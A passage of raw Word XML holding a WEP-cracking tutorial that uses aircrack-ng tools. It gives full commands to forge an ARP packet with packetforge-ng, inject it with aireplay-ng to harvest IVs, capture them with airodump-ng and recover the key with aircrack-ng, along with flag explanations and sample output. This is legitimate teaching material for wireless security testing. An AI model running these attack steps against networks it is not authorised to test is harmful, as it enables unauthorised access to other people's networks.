        <w:t xml:space="preserve">”. We can then use this PRGA to generate a packet for injection. We will be generating an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The objective is to have the access point rebroadcast the injected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When it rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E93CEFF"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But first, lets generate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by entering:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2778CA88"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5FFE783B"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packetforge</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-0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40574B72" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FF63059"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52A9C1AA"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means generate an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55776FFF"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62107049"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MAC address of our card</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB09AE1"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k</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313274F8"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l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BE0FA7" w14:textId="77777777" w:rsidR="002B0795"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y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B00520C" w14:textId="0E3E0336" w:rsidR="002B0795" w:rsidRPr="00307E5D" w:rsidRDefault="002B0795" w:rsidP="002B0795">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is name of file to write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 to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165863FD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C0DD43A" w14:textId="77777777" w:rsidR="00307E5D" w:rsidRDefault="00307E5D" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3993BC51" w14:textId="77777777" w:rsidR="00307E5D" w:rsidRDefault="00307E5D" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58009B47"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5 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2A51DFBE"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2201338C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23234C31"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1C2EAE79" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45E8140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356041F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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45E90B74" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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18693417" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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captured packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17000CC2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001F4FDF" w:rsidRDefault="002B0795" w:rsidP="002B0795">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interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F61D01" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37C3A7D9"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6 - Inject the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680B0CAB"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Using the console session where you generated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enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF1D7FD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AF7AC8B"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r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w: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-2 -r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 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA35413" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="003112DC" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36DD0EE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5990AD7F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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1E5CC039" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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r</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defines the file name from which to read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67471170" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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32048004" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008D7BBE" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71AFEC8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Enter “y” to use this packet. The system responds by showing how many packets it is injecting and reminds you to start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if it has not already been started:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0512A190"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replay_src-0204-104917.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E488E6" w14:textId="62A8B627" w:rsidR="002B0795" w:rsidRPr="00AB32B9"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You should also start</w:t>
      </w:r>
      <w:r w:rsidR="00AB32B9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AB32B9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AB32B9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture replies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A64AA2F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72E1A39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will notice that only one access point is being display since we included an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filter to limit the capture to a single BSSID. Also notice that the station packets are roughly equal to the BSSID data packets. This means injection is working well. Also notice the data rate of 336 packets per </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>second which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is also an indicator that the injection is working well. This is a pretty “ideal” injection scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554EB65E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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47B72990" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006848FE" w:rsidRDefault="002B0795" w:rsidP="002B0795">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the BSSID data packets are not increasing, make sure you are still associated with the access point. To do this, follow the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instructions in step 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C244FD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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p>
    <w:p w14:paraId="2FDD8949"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7 - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E8742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enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BD1D0A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="020FE1CD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008E353E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</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-b 00:14:6C:7E:40:80 capture*.ca</w:t>
      </w:r>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36562ECB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="234DF9DE"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01777525" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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capture</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all dump files starting with “capture” and ending in “cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED5C875" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A781D4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can run this while generating packets. In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. As a reminder, the requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the “--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D08EE6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Troubleshooting Tips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAE1684" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006848FE" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Sometimes you need to try various techniques to crack the WEP key. Try ”-n” to set various key lengths. Use ”-f” and try various fudge factors. Use ”-k” and try disabling various </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methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A2BBF7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7511CFCA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="475D6926" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Alternate Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6597BEE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must also do a successful fake authentication first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0982A30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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B5A6A6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AC71D5A"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-2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BDC0A9" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="019511BA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00954648" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED5C97D" w14:textId="77777777" w:rsidR="002B0795"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7A9F8DBC" w14:textId="77777777" w:rsidR="002B0795"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p</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0841 sets the Frame Control Field such that the packet looks like it is being sent from a wireless client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560D5BFB" w14:textId="77777777" w:rsidR="002B0795"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FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598EA198" w14:textId="77777777" w:rsidR="002B0795"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4FDA3642" w14:textId="77777777" w:rsidR="002B0795"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01606D5A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00203DFA" w:rsidRDefault="002B0795" w:rsidP="002B0795">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3F0EAF12" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00AB32B9" w:rsidRDefault="002B0795" w:rsidP="00AB32B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="315F0BE6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00954648">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>You enter “y” to select the packet and start injecting it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remember, the smaller the packet, the better. You then start injecting:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26583F89"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replay_src-0411-145110.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228A4177"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CFE2BC7"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Sent 10204 packets...(455 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE237F4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A894A2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have not already started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be sure to start it now. Once you have sufficient IVs, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEDC08F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F010F5B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00970925"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airodump</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-c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
